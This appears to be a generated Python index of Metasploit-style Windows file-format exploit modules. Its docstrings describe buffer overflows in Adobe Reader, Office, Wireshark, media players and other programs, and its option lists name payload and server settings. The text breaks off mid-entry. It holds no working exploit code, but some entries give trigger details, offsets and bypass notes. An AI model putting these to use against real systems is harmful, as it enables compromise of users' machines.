	class windows_fileformat_lotusnotes_lzh(object):
		"""
		
        This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when
        parsing a malformed, specially crafted LZH file. This vulnerability was
        discovered binaryhouse.net

      
		"""

		path = 'windows/fileformat/lotusnotes_lzh'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_icofx_bof(object):
		"""
		
        This module exploits a stack-based buffer overflow vulnerability in version 2.1
        of IcoFX. The vulnerability exists while parsing .ICO files, where an specially
        crafted ICONDIR header providing an arbitrary long number of images in the file
        can be used to trigger the overflow when reading the ICONDIRENTRY structures.
      
		"""

		path = 'windows/fileformat/icofx_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_wireshark_packet_dect(object):
		"""
		
          This module exploits a stack buffer overflow in Wireshark <= 1.4.4
        When opening a malicious .pcap file in Wireshark, a stack buffer occurs,
        resulting in arbitrary code execution.

        Note: To exploit the vulnerability remotely with Scapy: sendp(rdpcap("file")).
      
		"""

		path = 'windows/fileformat/wireshark_packet_dect'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_orbit_download_failed_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow in Orbit Downloader.
        The vulnerability is due to Orbit converting an URL ascii string to unicode
        in a insecure way with MultiByteToWideChar.
        The vulnerability is exploited with a specially crafted metalink file that
        should be opened with Orbit through the "File->Add Metalink..." option.
      
		"""

		path = 'windows/fileformat/orbit_download_failed_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_mjm_coreplayer2011_s3m(object):
		"""
		
          This module exploits a stack buffer overflow in MJM Core Player 2011
        When opening a malicious s3m file in this applications, a stack buffer overflow can be
        triggered, resulting in arbitrary code execution.
        This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.
      
		"""

		path = 'windows/fileformat/mjm_coreplayer2011_s3m'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_allplayer_m3u_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        ALLPlayer 2.8.1, caused by a long string in a playlist entry.
        By persuading the victim to open a specially-crafted .M3U file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows 7 SP1.
      
		"""

		path = 'windows/fileformat/allplayer_m3u_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_adobe_flatedecode_predictor02(object):
		"""
		
          This module exploits an integer overflow vulnerability in Adobe Reader and Adobe
        Acrobat Professional versions before 9.2.
      
		"""

		path = 'windows/fileformat/adobe_flatedecode_predictor02'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_utilprintf(object):
		"""
		
          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional
        < 8.1.3. By creating a specially crafted pdf that a contains malformed util.printf()
        entry, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/adobe_utilprintf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_hhw_hhp_compiledfile_bof(object):
		"""
		
          This module exploits a stack buffer overflow in HTML Help Workshop 4.74
        By creating a specially crafted hhp file, an an attacker may be able
        to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/hhw_hhp_compiledfile_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_adobe_u3d_meshdecl(object):
		"""
		
          This module exploits an array overflow in Adobe Reader and Adobe Acrobat.
          Affected versions include < 7.1.4, < 8.2, and < 9.3. By creating a
          specially crafted pdf that a contains malformed U3D data, an attacker may
          be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/adobe_u3d_meshdecl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_mcafee_hercules_deletesnapshot(object):
		"""
		
        This module exploits a stack buffer overflow in McAfee Remediation Agent 4.5.0.41. When
        sending an overly long string to the DeleteSnapshot() method
        of enginecom.dll (3.7.0.9) an attacker may be able to execute arbitrary code.
        This control is not marked safe for scripting, so choose your attack vector accordingly.
      
		"""

		path = 'windows/fileformat/mcafee_hercules_deletesnapshot'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_fatplayer_wav(object):
		"""
		
          This module exploits a buffer overflow in Fat Player 0.6b. When
        the application is used to import a specially crafted wav file, a buffer overflow occurs
        allowing arbitrary code execution.
      
		"""

		path = 'windows/fileformat/fatplayer_wav'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_adobe_collectemailinfo(object):
		"""
		
          This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional 8.1.1.
          By creating a specially crafted pdf that a contains malformed Collab.collectEmailInfo() call,
          an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/adobe_collectemailinfo'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ms12_005(object):
		"""
		
          This module exploits a vulnerability found in Microsoft Office's ClickOnce
        feature.  When handling a Macro document, the application fails to recognize
        certain file extensions as dangerous executables, which can be used to bypass
        the warning message.  This can allow attackers to trick victims into opening the
        malicious document, which will load up either a python or ruby payload, and
        finally, download and execute an executable.
      
		"""

		path = 'windows/fileformat/ms12_005'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_INIT_PAYLOAD = 'INIT_PAYLOAD'
			BODY = 'BODY'

	class windows_fileformat_audio_wkstn_pls(object):
		"""
		
          This module exploits a buffer overflow in Audio Workstation 6.4.2.4.3.
        When opening a malicious pls file with the Audio Workstation,
        a remote attacker could overflow a buffer and execute
        arbitrary code.
      
		"""

		path = 'windows/fileformat/audio_wkstn_pls'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ms10_004_textbytesatom(object):
		"""
		
          This module exploits a stack buffer overflow vulnerability in the handling of
        the TextBytesAtom records by Microsoft PowerPoint Viewer. According to Microsoft,
        the PowerPoint Viewer distributed with Office 2003 SP3 and earlier, as well as
        Office 2004 for Mac, are vulnerable.

        NOTE: The vulnerable code path is not reachable on versions of Windows prior to
        Windows Vista.
      
		"""

		path = 'windows/fileformat/ms10_004_textbytesatom'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'
			required_OUTPUTPATH = 'OUTPUTPATH'

	class windows_fileformat_ms11_006_createsizeddibsection(object):
		"""
		
          This module exploits a stack-based buffer overflow in the handling of thumbnails
        within .MIC files and various Office documents. When processing a thumbnail bitmap
        containing a negative 'biClrUsed' value, a stack-based buffer overflow occurs. This
        leads to arbitrary code execution.

        In order to trigger the vulnerable code, the folder containing the document must be
        viewed using the "Thumbnails" view.
      
		"""

		path = 'windows/fileformat/ms11_006_createsizeddibsection'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_real_player_url_property_bof(object):
		"""
		
          This module exploits a stack based buffer overflow on RealPlayer <=15.0.6.14.
        The vulnerability exists in the handling of real media files, due to the insecure
        usage of the GetPrivateProfileString function to retrieve the URL property from an
        InternetShortcut section.

        This module generates a malicious rm file which must be opened with RealPlayer via
        drag and drop or double click methods. It has been tested successfully on Windows
        XP SP3 with RealPlayer 15.0.5.109.
      
		"""

		path = 'windows/fileformat/real_player_url_property_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_zinfaudioplayer221_pls(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Zinf Audio Player 2.2.1.
        An attacker must send the file to victim and the victim must open the file.
        Alternatively it may be possible to execute code remotely via an embedded
        PLS file within a browser, when the PLS extention is registered to Zinf.
        This functionality has not been tested in this module.
      
		"""

		path = 'windows/fileformat/zinfaudioplayer221_pls'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_xion_m3u_sehbof(object):
		"""
		
          This module exploits a stack buffer overflow in Xion Audio Player prior to version
        1.0.126. The vulnerability is triggered when opening a malformed M3U file that
        contains an overly long string. This results in overwriting a
        structured exception handler record.
      
		"""

		path = 'windows/fileformat/xion_m3u_sehbof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			TARGETPATH = 'TARGETPATH'

	class windows_fileformat_tugzip(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability
        in the latest version 3.5 of TugZip archiving utility.
        In order to trigger the vulnerability, an attacker must convince someone
        to load a specially crafted zip file with TugZip by double click or file open.
        By doing so, an attacker can execute arbitrary code as the victim user.
      
		"""

		path = 'windows/fileformat/tugzip'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_foxit_reader_launch(object):
		"""
		
        This module exploits a buffer overflow in Foxit Reader 3.0 builds 1301 and earlier.
        Due to the way Foxit Reader handles the input from an "Launch" action, it is possible
        to cause a stack-based buffer overflow, allowing an attacker to gain arbitrary code
        execution under the context of the user.
      
		"""

		path = 'windows/fileformat/foxit_reader_launch'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_tfm_mmplayer_m3u_ppl_bof(object):
		"""
		
        This module exploits a buffer overflow in MMPlayer 2.2
        The vulnerability is triggered when opening a malformed M3U/PPL file
        that contains an overly long string, which results in overwriting a
        SEH record, thus allowing arbitrary code execution under the context
        of the user.
      
		"""

		path = 'windows/fileformat/tfm_mmplayer_m3u_ppl_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_winrar_name_spoofing(object):
		"""
		
        This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists
        when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from
        the central directory, but the file names used to extract and open contents come from the
        Local File Header. This inconsistency allows to spoof file names when opening ZIP files
        with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in
        March 2014
      
		"""

		path = 'windows/fileformat/winrar_name_spoofing'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SPOOF = 'SPOOF'

	class windows_fileformat_office_ole_multiple_dll_hijack(object):
		"""
		
        Multiple DLL side loading vulnerabilities were found in various COM components.
        These issues can be exploited by loading various these components as an embedded
        OLE object. When instantiating a vulnerable object Windows will try to load one
        or more DLLs from the current working directory. If an attacker convinces the
        victim to open a specially crafted (Office) document from a directory also
        containing the attacker's DLL file, it is possible to execute arbitrary code with
        the privileges of the target user. This can potentially result in the attacker
        taking complete control of the affected system.
      
		"""

		path = 'windows/fileformat/office_ole_multiple_dll_hijack'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_fileformat_foxit_reader_filewrite(object):
		"""
		
          This module exploits an unsafe Javascript API implemented in Foxit PDF Reader
          version 4.2. The createDataObject() Javascript API function allows for writing
          arbitrary files to the file system. This issue was fixed in version 4.3.1.0218.

          Note: This exploit uses the All Users directory currently, which required
          administrator privileges to write to. This means an administrative user has to
          open the file to be successful. Kind of lame but thats how it goes sometimes in
          the world of file write bugs.
      
		"""

		path = 'windows/fileformat/foxit_reader_filewrite'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DECODER = 'DECODER'

	class windows_fileformat_ms14_017_rtf(object):
		"""
		
        This module creates a malicious RTF file that when opened in
        vulnerable versions of Microsoft Word will lead to code execution.
        The flaw exists in how a listoverridecount field can be modified
        to treat one structure as another.

        This bug was originally seen being exploited in the wild starting
        in April 2014. This module was created by reversing a public
        malware sample.
      
		"""

		path = 'windows/fileformat/ms14_017_rtf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ms14_064_packager_run_as_admin(object):
		"""
		
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, publicly exploited in the wild as MS14-060 patch bypass.
        The Microsoft update tried to fix the vulnerability publicly known as "Sandworm". Platforms
        such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known
        to be vulnerable. However, based on our testing, the most reliable setup is on Windows
        platforms running Office 2013 and Office 2010 SP2. Please keep in mind that some other
        setups such as using Office 2010 SP1 might be less stable, and may end up with a
        crash due to a failure in the CPackage::CreateTempFileName function.
      
		"""

		path = 'windows/fileformat/ms14_064_packager_run_as_admin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_fileformat_djstudio_pls_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2.
        When handling a .pls file, DJ Studio will copy the user-supplied data on the stack
        without any proper bounds checking done beforehand, therefore allowing code
        execution under the context of the user.
      
		"""

		path = 'windows/fileformat/djstudio_pls_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ispvm_xcf_ispxcf(object):
		"""
		
          This module exploits a vulnerability found in ispVM System 18.0.2.  Due to the way
        ispVM handles .xcf files, it is possible to cause a buffer overflow with a specially
        crafted file, when a long value is supplied for the version attribute of the ispXCF
        tag. It results in arbitrary code execution under the context of the user.
      
		"""

		path = 'windows/fileformat/ispvm_xcf_ispxcf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_netop(object):
		"""
		
          This module exploits a stack-based buffer overflow in NetOp Remote Control 9.5.
        When opening a .dws file containing a specially crafted string longer then 520
        characters will allow an attacker to execute arbitrary code.
      
		"""

		path = 'windows/fileformat/netop'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ms15_100_mcl_exe(object):
		"""
		
        This module exploits a vulnerability in Windows Media Center. By supplying
        an UNC path in the *.mcl file, a remote file will be automatically downloaded,
        which can result in arbitrary code execution.
      
		"""

		path = 'windows/fileformat/ms15_100_mcl_exe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			FOLDER_NAME = 'FOLDER_NAME'

	class windows_fileformat_ibm_pcm_ws(object):
		"""
		
      The IBM Personal Communications I-Series application WorkStation is susceptible to a
      stack-based buffer overflow vulnerability within file parsing in which data copied to a
      location in memory exceeds the size of the reserved destination area. The buffer is located
      on the runtime program stack.

      When the WorkStation file is opened it will reach the code path at 0x67575180 located in
      pcspref.dll which conducts string manipulation and validation on the data supplied in the
      WorkStation file. The application will first check if 'Profile' header exists and appends
      a dot with the next parameter within the file. It will then measure the character length
      of the header by calling strcspn with a dot as its null-terminated character.

      It will then write the header into memory and ensure the header ends with a NUL character.
      The parameter character array is passed to the strcpy() function. The application has
      declared a 52-element character array for the destination for strcpy function. The
      function does not perform bounds checking therefore, data can be written paste the end of
      the buffer variable resulting in corruption of adjacent variables including other local
      variables, program state information and function arguments. You will notice that the
      saved RETURN address at offset 0x6c is overwritten by the data written past the buffer.

      To ensure we can perform arbitrary code execution we must we provide a valid pointer at
      0x74 which is used as a argument for the called function at 0x675751ED as a id file
      extension parameter. Once the caller regains control we will reach our RETURN. The Ret
      instruction will be used to pop the overwritten saved return address which was currupted.

      This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.

      Versions tested:
      IBM System i Access for Windows V6R1M0 version 06.01.0001.0000a
      Which bundles pcsws.exe version 5090.27271.709

      Tested on:
      Microsoft Windows XP     [Version 5.1.2600]
      Microsoft Windows Vista  [Version 6.0.6002]
      Microsoft Windows 7      [Version 6.1.7600]
      
		"""

		path = 'windows/fileformat/ibm_pcm_ws'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_kingview_kingmess_kvl(object):
		"""
		
          This module exploits a vulnerability found in KingView <= 6.55. It exists in
        the KingMess.exe application when handling log files, due to the insecure usage of
        sprintf. This module uses a malformed .kvl file which must be opened by the victim
        via the KingMess.exe application, through the 'Browse Log Files' option. The module
        has been tested successfully on KingView 6.52 and KingView 6.53 Free Trial over
        Windows XP SP3.
      
		"""

		path = 'windows/fileformat/kingview_kingmess_kvl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_lattice_pac_bof(object):
		"""
		
          This module exploits a vulnerability found in Lattice Semiconductor PAC-Designer
        6.21.  As a .pac file, when supplying a long string of data to the 'value' field
        under the 'SymbolicSchematicData' tag, it is possible to cause a memory corruption
        on the stack, which results in arbitrary code execution under the context of the
        user.
      
		"""

		path = 'windows/fileformat/lattice_pac_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_adobe_flashplayer_newfunction(object):
		"""
		
          This module exploits a vulnerability in the DoABC tag handling within
        versions 9.x and 10.0 of Adobe Flash Player. Adobe Reader and Acrobat are also
        vulnerable, as are any other applications that may embed Flash player.

        Arbitrary code execution is achieved by embedding a specially crafted Flash
        movie into a PDF document. An AcroJS heap spray is used in order to ensure
        that the memory used by the invalid pointer issue is controlled.

        NOTE: This module uses a similar DEP bypass method to that used within the
        adobe_libtiff module. This method is unlikely to work across various
        Windows versions due a the hardcoded syscall number.
      
		"""

		path = 'windows/fileformat/adobe_flashplayer_newfunction'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_nuance_pdf_launch_overflow(object):
		"""
		
          This module exploits a stack buffer overflow in Nuance PDF Reader v6.0. The vulnerability is
